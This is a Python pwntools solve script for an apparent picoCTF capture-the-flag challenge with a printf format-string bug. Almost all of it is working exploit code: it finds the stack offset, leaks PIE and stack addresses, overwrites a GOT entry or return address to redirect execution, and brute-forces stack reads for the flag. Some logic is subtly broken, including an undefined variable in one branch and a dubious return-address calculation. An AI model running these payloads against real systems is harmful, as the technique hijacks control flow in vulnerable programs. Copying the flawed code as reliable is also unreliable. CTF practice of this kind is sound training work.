#!/usr/bin/env python3
"""
Echo Escape 2 - picoCTF 2026
Category: Binary Exploitation | Points: 100

Format string vulnerability exploit.
The binary uses fgets() for safe input but passes the buffer directly
to printf() without a format specifier, enabling format string attacks.

Usage:
    python3 solve.py                     # Run against local binary
    python3 solve.py REMOTE_HOST PORT    # Run against remote server

Before running:
    1. Download the binary from the challenge page
    2. Run the offset finder first: python3 solve.py --find-offset
    3. Update the constants below if needed
    4. chmod +x echo_escape_2
"""

import sys
import re
from pwn import *

# ============================================================
# CONFIGURATION - UPDATE BASED ON BINARY ANALYSIS
# ============================================================

BINARY = "./echo_escape_2"
context.arch = "amd64"  # Change to "i386" if 32-bit

# Format string offset (position where our input appears on the stack)
# Find this by sending AAAAAAAA%p.%p.%p... and looking for 0x4141414141414141
FMT_OFFSET = 6  # UPDATE THIS after running --find-offset

# Offset from leaked address to win/print_flag function
# Determine via: objdump -t echo_escape_2 | grep -E "win|flag|main"
WIN_OFFSET_FROM_MAIN = None  # Set if PIE enabled (e.g., -0x1aa)

# ============================================================
# HELPERS
# ============================================================

def get_connection():
    """Connect to remote or run locally."""
    if len(sys.argv) >= 3 and sys.argv[1] != "--find-offset":
        host = sys.argv[1]
        port = int(sys.argv[2])
        log.info(f"Connecting to {host}:{port}")
        return remote(host, port)
    else:
        log.info(f"Running local binary: {BINARY}")
        return process(BINARY)


def find_offset():
    """
    Send a pattern to find the format string offset.
    Look for 0x4141414141414141 (64-bit) or 0x41414141 (32-bit).
    """
    p = get_connection()

    # Send marker followed by %p format specifiers
    payload = b"AAAAAAAA" + b".%p" * 30
    log.info(f"Sending: {payload}")

    p.recvuntil(b"\n", timeout=2)  # Skip any banner/prompt
    p.sendline(payload)

    response = p.recvall(timeout=3).decode(errors="ignore")
    print("\nResponse:")
    print(response)

    # Parse and find the offset
    parts = response.split(".")
    for i, part in enumerate(parts):
        if "0x4141414141414141" in part or "0x41414141" in part:
            # Offset is i (but first element is 'AAAAAAAA', so offset = i)
            print(f"\n>>> FORMAT STRING OFFSET FOUND: {i}")
            print(f">>> Use: FMT_OFFSET = {i}")
            p.close()
            return i

    print("\nOffset not found automatically. Check the output above manually.")
    print("Look for 0x4141414141414141 (64-bit) or 0x41414141 (32-bit).")
    p.close()
    return None


# ============================================================
# EXPLOIT STRATEGIES
# ============================================================

def exploit_with_win_function():
    """
    Strategy 1: Overwrite return address to call win/print_flag.
    Works when: Binary has a win() function, PIE may be enabled.
    """
    elf = ELF(BINARY)
    p = get_connection()

    # Check if PIE is enabled
    if elf.pie:
        log.info("PIE is enabled -- leaking addresses first")

        # Phase 1: Leak addresses
        # Leak return address and a known function address from the stack
        # Common positions: %19$p (saved RIP), %21$p (known function ptr)
        # These offsets vary per binary -- adjust as needed
        leak_payload = b"%19$p::%21$p"
        p.sendline(leak_payload)

        response = p.recvline(timeout=3).decode(errors="ignore")
        log.info(f"Leak response: {response}")

        addresses = response.strip().split("::")
        if len(addresses) >= 2:
            ret_addr_value = int(addresses[0], 16)
            main_addr = int(addresses[1], 16)

            # Calculate return address location and win function address
            # The return address on the stack is 8 bytes before the leaked value
            ret_addr_location = ret_addr_value - 8
            # Adjust based on your binary's symbol offsets
            win_addr = main_addr + WIN_OFFSET_FROM_MAIN if WIN_OFFSET_FROM_MAIN else elf.symbols.get('win', 0)

            log.info(f"Return address location: {hex(ret_addr_location)}")
            log.info(f"Win function address:    {hex(win_addr)}")

            # Phase 2: Overwrite return address with win address
            # Write in 2-byte chunks to keep payload short
            for offset_add, shift in [(0, 0), (2, 16), (4, 32)]:
                chunk = (win_addr >> shift) & 0xFFFF
                payload = fmtstr_payload(FMT_OFFSET,
                                         {ret_addr_location + offset_add: chunk},
                                         write_size='short')
                p.sendline(payload)
        else:
            log.error("Failed to leak addresses. Check leak offsets.")

    else:
        log.info("No PIE -- using direct addresses")

        # Find win function address
        win_addr = None
        for name in ['win', 'print_flag', 'get_flag', 'flag']:
            if name in elf.symbols:
                win_addr = elf.symbols[name]
                log.info(f"Found {name}() at {hex(win_addr)}")
                break

        if win_addr is None:
            log.error("No win function found. Check binary symbols.")
            p.close()
            return

        # Option A: Overwrite GOT entry (e.g., exit -> win)
        if 'exit' in elf.got:
            target = elf.got['exit']
            log.info(f"Overwriting exit@GOT ({hex(target)}) -> win ({hex(win_addr)})")
            payload = fmtstr_payload(FMT_OFFSET, {target: win_addr})
            p.sendline(payload)
        # Option B: Overwrite return address
        else:
            log.info("No exit@GOT found, trying return address overwrite")
            # For non-PIE, we still need to find the stack address of the
            # return pointer. Leak it first:
            p.sendline(b"%p." * 40)
            response = p.recvline(timeout=3).decode(errors="ignore")
            log.info(f"Stack leak: {response[:200]}")
            # Manual analysis needed here
            payload = fmtstr_payload(FMT_OFFSET, {target: win_addr})
            p.sendline(payload)

    # Collect output
    try:
        output = p.recvall(timeout=5).decode(errors="ignore")
    except Exception:
        output = p.recv(timeout=3).decode(errors="ignore")

    print("\n" + "=" * 50)
    print("Output:")
    print(output)
    print("=" * 50)

    flag_match = re.search(r'picoCTF\{[^}]+\}', output)
    if flag_match:
        print(f"\nFLAG: {flag_match.group(0)}")
    else:
        print("\nFlag not found. Try interactive mode or adjust offsets.")
        p.interactive()

    p.close()


def exploit_simple_leak():
    """
    Strategy 2: The flag might be on the stack already.
    Works when: The binary reads the flag into a stack buffer before printf.
    """
    p = get_connection()

    log.info("Trying to leak flag directly from the stack...")

    # Try leaking many stack positions as strings and pointers
    for i in range(1, 50):
        try:
            p2 = get_connection()
            p2.sendline(f"%{i}$s".encode())
            response = p2.recvall(timeout=2).decode(errors="ignore")
            if "picoCTF" in response:
                flag_match = re.search(r'picoCTF\{[^}]+\}', response)
                if flag_match:
                    print(f"\nFLAG found at offset {i}: {flag_match.group(0)}")
                    p2.close()
                    p.close()
                    return
            p2.close()
        except Exception:
            pass

    log.info("Flag not directly on stack. Use exploit_with_win_function() instead.")
    p.close()


# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    if "--find-offset" in sys.argv:
        find_offset()
    elif "--leak" in sys.argv:
        exploit_simple_leak()
    else:
        # Default: try the win function overwrite approach
        exploit_with_win_function()
